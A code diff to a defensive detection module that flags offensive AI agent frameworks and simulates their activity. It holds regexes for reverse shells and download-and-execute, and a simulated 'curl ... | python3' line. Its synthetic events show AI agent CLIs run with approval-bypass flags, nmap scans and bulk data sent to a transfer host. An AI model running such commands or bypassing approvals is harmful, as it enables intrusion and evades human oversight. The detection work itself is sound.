@@ -26,15 +26,26 @@ from app.config import settings
 from app.modules import threatintel
 
 SOURCE = "https://github.com/ThreatDefence/agentic-attack-detections"
+# id -> (name, description, behaviour focus, rules that cover that behaviour)
 FRAMEWORKS = {
-    "artex": ("ARTEX / AntiFox", "Autonomous pentest console (ARTEX) and its AntiFox fork; renamed builds exist"),
-    "cairn": ("Cairn", "Fact-graph exploration; Claude Code / Codex / Pi workers in a Kali container"),
-    "pentagi": ("PentAGI", "Autonomous pentest platform (vxcontrol); customized builds seen in Asia"),
-    "hexstrike": ("HexStrike AI", "MCP tool server exposing ~150 security tools, API on 8888"),
-    "cyberstrikeai": ("CyberStrikeAI", "Go console with ~90 tools, implant builder, C2 and webshell manager"),
-    "strix": ("Strix", "Python AI pentest agents in a Kali sandbox behind a Caido proxy"),
-    "hermes": ("Hermes Agent", "General agent abused with approvals off (--yolo) and a jailbreak skill"),
-    "agent-zero": ("Agent Zero", "General agent in a Kali container with a built-in hacker profile"),
+    "artex": ("ARTEX", "Autonomous pentest console; renamed builds exist (ScopeWeaver, ARTEX PRO)",
+              "Multi-step Intrusion, Autonomous Execution", ["OAI-005", "OAI-001", "OAI-012", "OAI-009", "OAI-006"]),
+    "antifox": ("AntiFox", "Fork of ARTEX with its own image, favicon and console",
+                "Fork-specific Indicators และ Behavior", ["OAI-006", "OAI-005", "OAI-001"]),
+    "cairn": ("CAIRN", "Fact-graph exploration; Claude Code / Codex / Pi workers in a Kali container",
+              "Multi-Agent Coordination, Tool Orchestration", ["OAI-012", "OAI-001", "OAI-003", "OAI-006"]),
+    "pentagi": ("PentAGI", "Autonomous pentest platform (vxcontrol); customized builds seen in Asia",
+                "Reconnaissance, Pentest Tool Chains", ["OAI-003", "OAI-005", "OAI-008", "OAI-006"]),
+    "hexstrike": ("HexStrike AI", "MCP tool server exposing ~150 security tools, API on 8888",
+                  "MCP-mediated Security Tool Invocation", ["OAI-013", "AGT-012", "OAI-003", "OAI-006"]),
+    "cyberstrikeai": ("CyberStrikeAI", "Go console with ~90 tools, implant builder, C2 and webshell manager",
+                      "Orchestrated Tool Execution", ["OAI-003", "OAI-005", "OAI-007", "OAI-006"]),
+    "strix": ("Strix", "Python AI pentest agents in a Kali sandbox behind a Caido proxy",
+              "Web/API Security Testing Patterns", ["OAI-008", "OAI-004", "OAI-007", "OAI-006"]),
+    "hermes": ("Hermes Agent", "General agent abused with approvals off (--yolo) and a jailbreak skill",
+               "Shell Execution, External Tool Access", ["OAI-014", "OAI-001", "AGT-003", "OAI-002", "OAI-006"]),
+    "agent-zero": ("Agent Zero", "General agent in a Kali container with a built-in hacker profile",
+                   "Dynamic Code Execution, Agent Workflows", ["OAI-014", "AGT-003", "OAI-006"]),
 }
 # Verbatim high-confidence seeds from the ThreatDefence indicators.csv (offline fallback only).
 SEED = [
@@ -93,7 +104,20 @@ RULES = {
     "OAI-009": ("Lateral movement fan-out (one source, many hosts)", "high", "T1021", "Lateral Movement"),
     "OAI-010": ("Suspicious database access (dump / bulk read)", "high", "T1213", "Collection"),
     "OAI-011": ("Data exfiltration after bulk access", "critical", "T1567", "Exfiltration"),
+    "OAI-012": ("Multiple AI agents with approvals off on one host (agent swarm)", "high", "T1059", "Execution"),
+    "OAI-013": ("Security tools launched by an MCP server", "high", "T1059", "Execution"),
+    "OAI-014": ("AI agent ran download-and-execute / encoded / dynamic code", "high", "T1059", "Execution"),
 }
+SWARM_WINDOW = 600
+MCP_SERVER_RE = re.compile(r"(hexstrike_(server|mcp)\.py|mcp[-_]server|fastmcp|\bmcp\s+(run|serve)\b|cyberstrike-ai)", re.I)
+AGENT_RUNTIME_RE = re.compile(r"(agent[-_ ]?zero|run_ui\.py|\bhermes\b|cairn|pentagi|strix|openhands|autogpt)", re.I)
+DYNAMIC_CODE = [
+    ("download-and-execute", re.compile(r"(curl|wget|iwr|invoke-webrequest)\b[^|;&]*\|\s*(sudo\s+)?((ba|z|da)?sh|python3?|perl|ruby|node|iex)\b", re.I)),
+    ("reverse shell", re.compile(r"(/dev/tcp/|\bnc(at)?\b[^|;]*\s-e\s|bash\s+-i\s*>&|socat\b.+exec:)", re.I)),
+    ("encoded payload", re.compile(r"(base64\s+(-d|--decode)\s*\||-enc(odedcommand)?\s+[A-Za-z0-9+/=]{20,}|frombase64string)", re.I)),
+    ("inline code", re.compile(r"((python3?|perl|ruby)\s+-[ce]\s+.{0,400}(exec|eval|base64|socket|urllib|subprocess|os\.system)|"
+                               r"node\s+-e\s+.{0,400}(child_process|eval|require\(.http))", re.I)),
+]
 # thresholds (tune per environment)
 BURST_REQ, BURST_PATHS, BURST_WINDOW = 60, 40, 60          # OAI-008: per source IP and target
 LATERAL_HOSTS, LATERAL_WINDOW = 10, 600                      # OAI-009
@@ -180,6 +204,7 @@ class Detector:
         self.lateral: dict[str, deque] = defaultdict(deque)      # source -> (ts, dest)
         self.db_reads: dict[str, deque] = defaultdict(deque)     # user -> (ts, rows, bytes)
         self.bulk_access: dict[str, float] = {}                  # user/host -> ts of last OAI-010
+        self.agent_runs: dict[str, deque] = defaultdict(deque)   # host -> (ts, agent cli) in approvals-off mode
 
     def _once(self, key: tuple, now: float, every: float = 600) -> bool:
         last = self.fired.get(key)
@@ -187,6 +212,19 @@ class Detector:
             return False
         self.fired[key] = now
         return True
+
+    def _ancestor(self, host: str, pid, rec: dict, pred) -> dict | None:
+        """First ancestor (parent fields on the record, then the process table) where pred(image, cmdline)."""
+        if rec.get("parent_cmdline") and pred(rec.get("parent_image", ""), rec["parent_cmdline"]):
+            return {"pid": pid, "cmdline": rec["parent_cmdline"]}
+        for _ in range(6):
+            p = self.procs.get((host, pid))
+            if p is None:
+                return None
+            if pred(p.get("image", ""), p.get("cmdline", "")):
+                return p
+            pid = p.get("ppid")
+        return None
 
     def _ancestor_bypass(self, host: str, pid, rec: dict | None = None) -> dict | None:
         # EDR rows (Defender, ECS) carry the parent's command line, so check it before walking the tree
@@ -307,6 +345,28 @@ class Detector:
                 tools = {x for _, x in q}
                 if len(tools) >= FANOUT_TOOLS and self._once(("OAI-003", src), now):
                     out.append(("OAI-003", {"tools": sorted(tools)}))
+                mcp = self._ancestor(rec["host"], rec.get("ppid"), rec, lambda i, c: bool(MCP_SERVER_RE.search(c or "")))
+                if mcp and self._once(("OAI-013", rec["host"], mcp["pid"]), now):
+                    hs = "hexstrike" in mcp["cmdline"].lower()
+                    out.append(("OAI-013", {"mcp_server_cmdline": mcp["cmdline"][:200], "tool": t,
+                                            **({"framework": "hexstrike", "severity": "critical"} if hs else {})}))
+            cmd = rec.get("cmdline") or ""
+            if t in AGENT_CLIS and APPROVAL_BYPASS.search(cmd):  # OAI-012: several agents driven together
+                q = self.agent_runs[rec["host"]]
+                q.append((now, t))
+                while q and now - q[0][0] > SWARM_WINDOW:
+                    q.popleft()
+                clis = {x for _, x in q}
+                if (len(clis) >= 2 or len(q) >= 3) and self._once(("OAI-012", rec["host"]), now):
+                    out.append(("OAI-012", {"agents": sorted(clis), "instances": len(q)}))
+            for why, rx in DYNAMIC_CODE:  # OAI-014: agent runtime running risky code
+                if rx.search(cmd):
+                    ag = self._ancestor(rec["host"], rec.get("ppid"), rec,
+                                        lambda i, c: tool_name(i) in AGENT_CLIS or bool(AGENT_RUNTIME_RE.search(c or "")))
+                    if ag and self._once(("OAI-014", rec["host"], ag["pid"], why), now):
+                        out.append(("OAI-014", {"pattern": why, "agent_cmdline": ag["cmdline"][:200],
+                                                "severity": "critical" if why == "reverse shell" else None}))
+                    break
         elif k == "net":
             hit = llm_api(rec.get("dest"))
             host = rec.get("host", "")
@@ -352,6 +412,8 @@ class Detector:
                                         "requests": sum(per_ip[ip] for ip in probers)}))
         for ind in self.index.match(rec):
             fw = ind.get("framework", "")
+            if "antifox" in (ind["_v"] + " " + (ind.get("context") or "")).lower() and "antifox" not in fw:
+                fw = f"{fw} antifox".strip()
             if self._once(("OAI-006", entity, ind["_v"]), now):
                 out.append(("OAI-006", {"framework": fw, "indicator": ind["value"][:120], "ioc_type": ind["type"],
                                         "confidence": ind.get("confidence"), "source_url": ind.get("source_url"),
@@ -462,7 +524,26 @@ class OffensiveAISim:
                      "logon_type": 3} for h in ["SRV-DC-01", "SRV-FILE-02", "SRV-SQL-01", "SRV-WEB-01", "SRV-AI-01",
                                                "SRV-AI-02", "FIN-WS-014", "EXEC-LT-001", "SALES-LT-031", "IT-WS-003",
                                                "DEV-WS-102"]]
-        if x < 0.016:
+        if x < 0.019:  # CAIRN-style swarm: several agent CLIs with approvals off on one box
+            pid = next(self.pids)
+            return [{"kind": "process", "host": "SRV-AI-02", "user": "svc.ai.devops", "pid": pid + i, "ppid": 1,
+                     "image": cli, "cmdline": cmd} for i, (cli, cmd) in enumerate([
+                         ("claude", "claude --dangerously-skip-permissions -p 'worker 1: map 10.0.6.0/24'"),
+                         ("codex", "codex exec --dangerously-bypass-approvals-and-sandbox 'worker 2: exploit web'"),
+                         ("pi", "pi --provider cairn --yolo 'worker 3: report'")])]
+        if x < 0.022:  # HexStrike: tools launched by the MCP tool server
+            pid = next(self.pids)
+            return [{"kind": "process", "host": "DEV-WS-102", "user": "dev.backend", "pid": pid, "ppid": 1,
+                     "image": "python3", "cmdline": "python3 hexstrike_server.py --port 8888"},
+                    {"kind": "process", "host": "DEV-WS-102", "user": "dev.backend", "pid": pid + 1, "ppid": pid,
+                     "image": "nmap", "cmdline": "nmap -sV -T4 10.0.7.0/24"}]
+        if x < 0.025:  # Agent Zero / Hermes: dynamic code from the agent runtime
+            pid = next(self.pids)
+            return [{"kind": "process", "host": "SRV-AI-01", "user": "svc.ai.support", "pid": pid, "ppid": 1,
+                     "image": "python3", "cmdline": "python3 run_ui.py --agent agent-zero"},
+                    {"kind": "process", "host": "SRV-AI-01", "user": "svc.ai.support", "pid": pid + 1, "ppid": pid,
+                     "image": "bash", "cmdline": "bash -c 'curl -s https://files.example/x.py | python3'"}]
+        if x < 0.029:
             return [{"kind": "db", "host": "SRV-SQL-01", "user": "svc.report", "client_host": "SRV-FILE-02",
                      "statement": "SELECT * FROM customers", "rows": 120_000, "bytes": 64_000_000},
                     {"kind": "dlp", "host": "SRV-FILE-02", "user": "svc.report", "dest": "drive.share-transfer.example",
@@ -530,7 +611,7 @@ class OffensiveAIMonitor:
                 domain = {"process": "endpoint", "logon": "identity", "db": "data", "dlp": "data"}.get(kind, "network")
                 host = rec.get("dst_host") if kind == "http" else rec.get("dest_host") if kind == "logon" else rec.get("host")
                 user = rec.get("user") or (f"src:{rec['src_ip']}" if rec.get("src_ip") else "unknown")
-                detail = extra.get("framework") and FRAMEWORKS.get(extra["framework"].split()[0], (extra["framework"],))[0]
+                detail = extra.get("framework") and " / ".join(FRAMEWORKS.get(f, (f,))[0] for f in extra["framework"].split())
                 label = f"[{rule}] {title}" + (f" — {detail}" if detail else "") + (
                     f" — {extra['provider']} ({extra['region']})" if extra.get("provider") else "")
                 alerts.append({"spec": (domain, label, sev, tech, tactic), "host": host, "user": user,
@@ -547,13 +628,18 @@ class OffensiveAIMonitor:
         idx = threatintel.agentic_index() or []
         per_fw: dict[str, Counter] = defaultdict(Counter)
         for r in idx:
-            for fw in (r.get("framework") or "").split():
+            fws = (r.get("framework") or "").split()
+            if "antifox" in ((r.get("value") or "") + " " + (r.get("context") or "")).lower():
+                fws.append("antifox")
+            for fw in set(fws):
                 per_fw[fw][r["type"]] += 1
         return {
             "rules": [{"id": k, "title": t, "severity": s, "technique": te, "tactic": ta, "hits": self.rule_hits[k]}
                       for k, (t, s, te, ta) in RULES.items()],
-            "frameworks": [{"id": k, "name": n, "desc": d, "hits": self.fw_hits[k],
+            "frameworks": [{"id": k, "name": n, "desc": d, "focus": focus, "hits": self.fw_hits[k],
+                            "rules": [{"id": r, "hits": self.rule_hits[r] if r.startswith("OAI") else None}
+                                      for r in rules],
                             "indicators": sum(per_fw[k].values()), "by_type": dict(per_fw[k].most_common(4))}
-                           for k, (n, d) in FRAMEWORKS.items()],
+                           for k, (n, d, focus, rules) in FRAMEWORKS.items()],
             "feed_loaded": bool(idx),
         }
